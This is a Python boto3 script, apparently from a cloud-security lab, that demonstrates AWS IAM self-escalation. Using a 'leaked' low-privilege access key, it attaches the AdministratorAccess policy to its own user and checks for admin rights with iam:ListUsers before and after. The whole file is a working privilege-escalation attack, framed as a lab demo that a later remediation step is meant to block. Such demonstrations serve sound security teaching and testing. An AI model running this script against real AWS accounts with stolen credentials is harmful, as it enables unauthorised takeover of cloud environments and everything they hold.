import argparse
import sys
import time

import boto3
from botocore.exceptions import ClientError

ADMIN_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"


# Explicit creds, not the ambient profile: the demo must act AS the leaked key.
# Falling back to the operator's admin profile would prove nothing — we'd have
# been admin all along.
def leaked_session(access_key_id: str, secret_access_key: str):
    return boto3.Session(
        aws_access_key_id=access_key_id,
        aws_secret_access_key=secret_access_key,
    )


# Account-wide iam:ListUsers is admin-only here: the leaked identity can manage
# IAM on itself but cannot enumerate the account. We use it as the before/after
# gate that proves whether escalation actually happened.
def is_admin(session) -> bool:
    try:
        session.client("iam").list_users(MaxItems=1)
        return True
    except ClientError as e:
        if e.response["Error"]["Code"] in ("AccessDenied", "AccessDeniedException"):
            return False
        raise


def run(access_key_id: str, secret_access_key: str, user: str, policy_arn: str) -> int:
    session = leaked_session(access_key_id, secret_access_key)
    identity = session.client("sts").get_caller_identity()
    print(f"[*] Authenticated as: {identity['Arn']}")
    print(f"[*] Target user:      {user}")
    print(f"[*] Policy to attach: {policy_arn}\n")

    if is_admin(session):
        print("[-] Identity is already admin before the attack — nothing to prove.")
        print("    Re-deploy the scenario infra for a clean run.")
        return 1
    print("[*] Pre-check: iam:ListUsers denied — identity is NOT admin yet.")

    print("[*] Escalating: attaching AdministratorAccess to self...")
    try:
        session.client("iam").attach_user_policy(UserName=user, PolicyArn=policy_arn)
    except ClientError as e:
        # AccessDenied here is the GOOD outcome: once remediation has quarantined
        # the identity the escalation primitive is gone and the attack stops working.
        print(f"[+] Escalation blocked ({e.response['Error']['Code']}).")
        print("    The escalation primitive has been neutralized — expected after remediation.")
        return 1

    # IAM is eventually consistent: a freshly attached policy can take a few
    # seconds to take effect. Poll instead of asserting once and flaking.
    print("[*] Verifying new privileges (allowing for IAM propagation)...")
    for _ in range(10):
        if is_admin(session):
            print("\n[!] SUCCESS - the dev identity can now enumerate every IAM user.")
            print("[!] Privilege escalated to administrator from a single leaked key.")
            return 0
        time.sleep(3)

    print("[-] Policy attached but admin access not observed within the timeout.")
    return 1


def main():
    parser = argparse.ArgumentParser(
        description="IAM self-escalation demo (lab only): attach AdministratorAccess to self."
    )
    parser.add_argument("--access-key-id", required=True, help="Leaked key id (terraform output)")
    parser.add_argument(
        "--secret-access-key",
        required=True,
        help="Leaked secret (terraform output -raw lowpriv_secret_access_key)",
    )
    parser.add_argument(
        "--user", default="aegis-project-lab-developer", help="User to escalate"
    )
    parser.add_argument(
        "--policy-arn", default=ADMIN_POLICY_ARN, help="Admin-equivalent policy to attach"
    )
    args = parser.parse_args()
    sys.exit(run(args.access_key_id, args.secret_access_key, args.user, args.policy_arn))


if __name__ == "__main__":
    main()